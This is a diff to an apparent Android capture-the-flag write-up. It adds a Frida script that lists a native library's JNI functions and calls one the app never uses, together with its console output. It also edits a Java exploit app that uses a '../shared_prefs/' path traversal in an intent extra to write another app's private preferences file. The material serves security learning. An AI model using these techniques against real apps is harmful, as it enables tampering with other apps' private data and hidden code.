@@ -333,6 +333,28 @@ approach this; but the easy and quick way is to use frida. The other approach ca
 
 ![img-description](3_3.png)
 
+We can also use a frida api `Module.enumerateExports()` to search for user defined functions in the binary. 
+
+```bash
+frida -U -n 'Hello Android'
+...                                                     
+[Pixel 7::Hello Android ]-> Module.enumerateExports("libhelloandroid.so").forEach(function(exp) {
+    if (exp.type === 'function' && exp.name.startsWith('Java_')) {
+        console.log("User-defined Function: " + exp.name + " Address: " + exp.address);
+    }
+});
+User-defined Function: Java_com_example_helloandroid_MainActivity_stringFromJNI Address: 0x73193048e6c0
+User-defined Function: Java_com_example_helloandroid_MainActivity_neverCalled Address: 0x73193048e770
+```
+
+```js
+Module.enumerateExports("libhelloandroid.so").forEach(function(exp) {
+    if (exp.type === 'function' && exp.name.startsWith('Java_')) {
+        console.log("User-defined Function: " + exp.name + " Address: " + exp.address);
+    }
+});
+```
+
 we create a frida script to trigger the method.
 
 ```js
@@ -349,20 +371,25 @@ console.log("Env address", env.handle)
 neverCalled(env.handle, ptr(0)); // calling the function with the parameters
 ```
 
-Running the exploit.
+We run our exploit and Reload it to get the addresses once loaded into memory.
 
 ```bash
 frida -U -l frida.js -f com.example.helloandroid
+...
+Spawning `com.example.helloandroid`...                                  
+Function address: null
+Spawned `com.example.helloandroid`. Resuming main thread!               
+Error: expected a pointer
+    at <eval> (/Downloads/frida.js:14)
+[Pixel 7::com.example.helloandroid ]-> %reload
+Function address: 0x73192bcfa770
+Env address: 0x731a57246050
+[Pixel 7::com.example.helloandroid ]->
 ```
-
-Reload it to get the addresses once loaded into memory.
-
-![img-description](3_4.png)
 
 Check for the logs to retrieve the flag.
 
 ![img-description](3_5.png)
-
 
 ## Spider View
 
@@ -644,6 +671,7 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 
 public class MainActivity extends AppCompatActivity {
+    TextView textView;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -655,9 +683,10 @@ public class MainActivity extends AppCompatActivity {
             return insets;
         });
         Button button = findViewById(R.id.button);
+        textView = findViewById(R.id.textView);
         button.setOnClickListener(v -> {
             Intent intent = new Intent();
-            // putextra the file name we want to be granted the permissions to read and write
+            // path traversal allows us to putextra the file name we want to be granted the permissions to read and write
             intent.putExtra("filename", "../shared_prefs/treasure_preference.xml");
             // set the classname to trigger
             intent.setClassName("com.example.unchartedpath", "com.example.unchartedpath.UnchartedPathActivity");
@@ -681,6 +710,7 @@ public class MainActivity extends AppCompatActivity {
             if (outputStream != null) {
                 outputStream.write(xmlContent.getBytes());
                 outputStream.close();
+                textView.setText("Successfully wrote to file: " + uri);
                 Log.d("Exploit", "Successfully wrote to file: " + uri);
             }
         } catch (IOException e) {
